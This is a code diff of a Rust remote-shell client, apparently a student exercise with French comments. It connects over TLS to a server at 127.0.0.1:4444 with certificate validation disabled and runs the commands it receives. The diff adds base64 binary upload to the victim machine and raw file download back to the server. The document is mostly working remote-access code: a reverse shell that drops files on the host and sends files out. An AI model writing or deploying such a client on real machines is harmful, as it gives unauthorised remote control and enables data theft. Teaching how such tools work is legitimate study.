@@ -1,11 +1,11 @@
-use std::io::{Write, BufRead, BufReader}; // On a enlevé Read
+use std::io::{Write, BufRead, BufReader};
 use std::net::TcpStream;
-use std::process::Command; // On a enlevé Stdio
+use std::process::Command;
 use std::path::Path;
 use std::{env, fs};
 use native_tls::TlsConnector;
+use base64::{Engine as _, engine::general_purpose};
 
-// Configuration de la connexion (À changer pour votre démo)
 const SERVER_IP: &str = "127.0.0.1";
 const SERVER_PORT: &str = "4444";
 
@@ -13,7 +13,7 @@ fn main() {
     println!("Démarrage du client Remote Shell...");
 
     let connector = TlsConnector::builder()
-        .danger_accept_invalid_certs(true) 
+        .danger_accept_invalid_certs(true)  //De base TLS protège contre l'usurpation d'identité en vérifiant que le certificat du serveur est signé par une autorité reconnue (ex:GOOGLE), mais nous dans le cadre de ce projet on a créer un certificat donc pas connu
         .build()
         .unwrap();
 
@@ -21,24 +21,25 @@ fn main() {
         Ok(stream) => {
             println!("Connecté à {}:{}", SERVER_IP, SERVER_PORT);
             
-            match connector.connect(SERVER_IP, stream) {
+            match connector.connect(SERVER_IP, stream) { //Handshake TLS.
                 Ok(mut stream) => {
                     println!("Tunnel TLS sécurisé établi.");
                     
-                    // On enveloppe le stream dans un Reader pour lire ligne par ligne
                     let mut reader = BufReader::new(stream);
                     let mut buffer = String::new();
 
                     loop {
-                        buffer.clear();
-                        match reader.read_line(&mut buffer) {
+                        buffer.clear(); // Vide la mémoire de la commande précedante
+                        match reader.read_line(&mut buffer) { // Attends la nouvelle commande
                             Ok(n) => {
-                                if n == 0 { break; } // Connexion fermée par le serveur
+                                if n == 0 { break; }
                                 let cmd_line = buffer.trim().to_string();
-                                
-                                // --- CORRECTION ICI ---
-                                // Au lieu de cloner et lancer un thread, on récupère 
-                                // une référence mutable au stream TLS directement depuis le reader.
+
+
+
+                                // On a mis le flux réseaux (stream) dans un buffer pour pouvoir lire ligne par ligne.
+                                // reader = propriaitaire du flux mais pour répondre au serveur -> écrire dans le flux.
+                                // get_mut() = avoir un accès modifiable du flux le temps d'envoyer la réponse.
                                 let output_stream = reader.get_mut();
                                 
                                 process_command(cmd_line, output_stream);
@@ -57,18 +58,22 @@ fn main() {
     }
 }
 
-/// Fonction centrale qui analyse et exécute les ordres
+/// Fonction centrale qui analyse et exécute les commandes
 fn process_command(cmd_line: String, stream: &mut native_tls::TlsStream<TcpStream>) {
     let parts: Vec<&str> = cmd_line.split_whitespace().collect();
     if parts.is_empty() { return; }
 
-    let command = parts[0];
-    let args = &parts[1..];
+    //exemple avec uplaod ok test.txt
+    let command = parts[0];  // contient upload
+    let args = &parts[1..]; // ["ok", "test.txt"]
 
     match command {
         "cd" => {
             // Changement de répertoire (commande interne au shell)
             let new_dir = if args.is_empty() { "/" } else { args[0] };
+
+            //On modifie l'environnement du processus Rust lui-même. Si on lançait juste cmd /c cd .., cela lancerait un sous-processus qui changerait de dossier puis s'éteindrait immédiatement, 
+            //sans affecter notre programme.
             let root = Path::new(new_dir);
             if let Err(e) = env::set_current_dir(&root) {
                 let _ = stream.write_all(format!("Erreur CD: {}\n", e).as_bytes());
@@ -77,26 +82,40 @@ fn process_command(cmd_line: String, stream: &mut native_tls::TlsStream<TcpStrea
             }
         },
         "upload" => {
-            // Syntaxe attendue: upload <contenu_en_base64_ou_texte> <nom_fichier>
-            // Pour simplifier ce TP, on écrit juste du texte dans un fichier.
+            // Nouvelle Syntaxe reçue du serveur: upload <BASE64_DATA> <NOM_FICHIER>
             if args.len() >= 2 {
-                let filename = args[args.len()-1];
-                let content = args[0..args.len()-1].join(" ");
-                if let Err(e) = fs::write(filename, content) {
-                    let _ = stream.write_all(format!("Erreur Upload: {}\n", e).as_bytes());
-                } else {
-                    let _ = stream.write_all(b"Fichier uploade avec succes.\n");
+                let b64_data = args[0];
+                let filename = args[1];
+
+                // 1. On décode le Base64 pour retrouver les octets originaux (binaire)
+                match general_purpose::STANDARD.decode(b64_data) {
+                    Ok(bytes) => {
+                        // 2. On écrit les octets bruts dans le fichier
+                        if let Err(e) = fs::write(filename, bytes) {
+                             let _ = stream.write_all(format!("Erreur écriture disque: {}\n", e).as_bytes());
+                        } else {
+                             let _ = stream.write_all(b"Succes: Fichier binaire uploade.\n");
+                        }
+                    },
+                    Err(e) => {
+                         let _ = stream.write_all(format!("Erreur décodage Base64: {}\n", e).as_bytes());
+                    }
                 }
+            } else {
+                 let _ = stream.write_all(b"Erreur protocole upload.\n");
             }
         },
         "download" => {
-            // Syntaxe attendue: download <nom_fichier>
             if let Some(filename) = args.get(0) {
-                match fs::read_to_string(filename) {
-                    Ok(content) => {
-                        let _ = stream.write_all(format!("Content of {}:\n{}\n", filename, content).as_bytes());
+                // read() renvoie un Vec<u8> (une suite d'octets), compatible avec tout (images, exe, pdf...)
+                //Lit le fichier bit par bit
+                match fs::read(filename) {
+                    Ok(data) => {
+                        // On envoie les données brutes directement.
+                        let _ = stream.write_all(&data);
                     },
                     Err(e) => {
+                        
                         let _ = stream.write_all(format!("Erreur Download: {}\n", e).as_bytes());
                     }
                 }
